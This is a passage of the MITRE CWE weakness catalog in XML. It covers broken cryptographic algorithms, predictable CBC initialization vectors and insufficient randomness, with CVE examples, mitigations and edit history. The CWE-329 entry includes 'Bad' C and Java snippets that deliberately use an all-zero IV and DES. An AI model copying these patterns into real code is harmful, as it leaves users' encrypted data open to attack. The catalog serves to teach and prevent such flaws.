               <Description>Product substitutes characters with other characters in a fixed way, and also leaves certain input characters unchanged.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2058</Reference>
               <Description>Attackers can infer private IP addresses by dividing each octet by the MD5 hash of '20'.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3188</Reference>
               <Description>Product uses DES when MD5 has been specified in the configuration, resulting in weaker-than-expected password hashes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3188</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2946</Reference>
               <Description>Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6013</Reference>
               <Description>Product uses the hash of a hash for authentication, allowing attackers to gain privileges if they can obtain the original hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6013</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using a broken or risky cryptographic algorithm</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-327</Entry_ID>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
              <Entry_Name>Req SR 4.3</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
              <Entry_Name>Req CR 4.3</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="20"/>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="475"/>
            <Related_Attack_Pattern CAPEC_ID="608"/>
            <Related_Attack_Pattern CAPEC_ID="614"/>
            <Related_Attack_Pattern CAPEC_ID="97"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-280"/>
            <Reference External_Reference_ID="REF-281"/>
            <Reference External_Reference_ID="REF-282"/>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-284"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 21: Using the Wrong Cryptography.&#34; Page 315"/>
            <Reference External_Reference_ID="REF-287"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Insufficient or Obsolete Encryption&#34;, Page 44"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-327"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1192"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
           <Note Type="Maintenance">Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.</Note>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2019-01-03</Modification_Date>
	      <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2019-06-20</Modification_Date>
	      <Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2020-02-24</Modification_Date>
	      <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Maintenance_Notes, Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2021-03-15</Modification_Date>
	      <Modification_Comment>updated References</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2021-10-28</Modification_Date>
	      <Modification_Comment>updated Maintenance_Notes, Potential_Mitigations, Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2022-04-28</Modification_Date>
	      <Modification_Comment>updated Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2022-10-13</Modification_Date>
	      <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
	    </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Background_Details, Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Potential_Mitigations, References, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
	    <Contribution Type="Content">
	      <Contribution_Name>Parbati K. Manna</Contribution_Name>
	      <Contribution_Organization>Intel Corporation</Contribution_Organization>
	      <Contribution_Date>2019-12-10</Contribution_Date>
	      <Contribution_Comment>Provide a hardware-specific submission whose contents were integrated into this entry, affecting extended description, applicable platforms, demonstrative examples, and mitigations</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Using a Broken or Risky Cryptographic Algorithm</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="329" Name="Generation of Predictable IV with CBC Mode" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product generates and uses a predictable initialization Vector (IV) with Cipher Block Chaining (CBC) Mode, which causes algorithms to be susceptible to dictionary attacks when they are encrypted under the same key.</Description>
	 <Extended_Description>
	   <xhtml:p>CBC mode eliminates a weakness of Electronic Code
	   Book (ECB) mode by allowing identical plaintext blocks to
	   be encrypted to different ciphertext blocks. This is
	   possible by the XOR-ing of an IV with the initial plaintext
	   block so that every plaintext block in the chain is XOR'd
	   with a different value before encryption. If IVs are
	   reused, then identical plaintexts would be encrypted to
	   identical ciphertexts. However, even if IVs are not
	   identical but are predictable, then they still break the
	   security of CBC mode against Chosen Plaintext Attacks
	   (CPA).</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1204" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
	      <xhtml:p>CBC mode is a commonly used mode of operation for a
	      block cipher. It works by XOR-ing an IV with the initial
	      block of a plaintext prior to encryption and then
	      XOR-ing each successive block of plaintext with the
	      previous block of ciphertext before encryption.</xhtml:p>
	      <xhtml:div style="margin-left:1em;">
		C_0 = IV<xhtml:br/>
		C_i = E_k{M_i XOR C_{i-1}}
	      </xhtml:div>
	      <xhtml:p>
		When used properly, CBC mode provides security against
		chosen plaintext attacks. Having an unpredictable IV
		is a crucial underpinning of this. See [REF-1171].</xhtml:p>
	      </Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
	       <Note>Developers might dismiss the importance of an unpredictable IV and choose an easier implementation to save effort, weakening the scheme in the process.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the IV is not properly initialized, data that is encrypted can be compromised and leak information.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>NIST recommends two methods of generating unpredictable IVs for CBC mode [REF-1172]. The first is to generate the IV randomly. The second method is to encrypt a nonce with the same key and cipher to be used to encrypt the plaintext. In this case the nonce must be unique but can be predictable, since the block cipher will act as a pseudo random permutation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-143">
               <Intro_Text>In the following examples, CBC mode is used when encrypting data:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>EVP_CIPHER_CTX ctx;<xhtml:br/>char key[EVP_MAX_KEY_LENGTH];<xhtml:br/>char iv[EVP_MAX_IV_LENGTH];<xhtml:br/>RAND_bytes(key, b);<xhtml:br/>memset(iv,0,EVP_MAX_IV_LENGTH);<xhtml:br/>EVP_EncryptInit(&amp;ctx,EVP_bf_cbc(), key,iv);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class SymmetricCipherTest {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public static void main() {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>byte[] text ="Secret".getBytes();<xhtml:br/>byte[] iv ={<xhtml:div style="margin-left:1em;">0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00</xhtml:div>};<xhtml:br/>KeyGenerator kg = KeyGenerator.getInstance("DES");<xhtml:br/>kg.init(56);<xhtml:br/>SecretKey key = kg.generateKey();<xhtml:br/>Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");<xhtml:br/>IvParameterSpec ips = new IvParameterSpec(iv);<xhtml:br/>cipher.init(Cipher.ENCRYPT_MODE, key, ips);<xhtml:br/>return cipher.doFinal(inpBytes);</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
	 <Observed_Examples>
	   <Observed_Example>
	     <Reference>CVE-2020-5408</Reference>
	     <Description>encryption functionality in an authentication framework uses a fixed null IV with CBC mode, allowing attackers to decrypt traffic in applications that use this functionality</Description>
			    <Link>https://www.cve.org/CVERecord?id=CVE-2020-5408</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2017-17704</Reference>
	     <Description>messages for a door-unlocking product use a fixed IV in CBC mode, which is the same after each restart </Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2017-17704</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2017-11133</Reference>
	     <Description>application uses AES in CBC mode, but the pseudo-random secret and IV are generated using math.random, which is not cryptographically strong.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2017-11133</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2007-3528</Reference>
	     <Description>Blowfish-CBC implementation constructs an IV where each byte is calculated modulo 8 instead of modulo 256, resulting in less than 12 bits for the effective IV length, and less than 4096 possible IV values.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2007-3528</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2011-3389</Reference>
	     <Description>BEAST attack in SSL 3.0 / TLS 1.0. In CBC mode, chained initialization vectors are non-random, allowing decryption of HTTPS traffic using a chosen plaintext attack.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2011-3389</Link>
	   </Observed_Example>
	 </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Not using a random IV with CBC mode</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Initialization Vectors&#34;, Page 42"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1171"/>
            <Reference External_Reference_ID="REF-1172" Section="Appendix C"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Functional_Areas, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Modes_of_Introduction, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Name, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Modes_of_Introduction, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2021-03-15">Not Using a Random IV with CBC Mode</Previous_Entry_Name>
			<Previous_Entry_Name Date="2021-07-20">Not Using an Unpredictable IV with CBC Mode</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="330" Name="Use of Insufficiently Random Values" Abstraction="Class" Structure="Simple" Status="Stable">
         <Description>The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers.</Description>
         <Extended_Description>When product generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="804" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>When a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
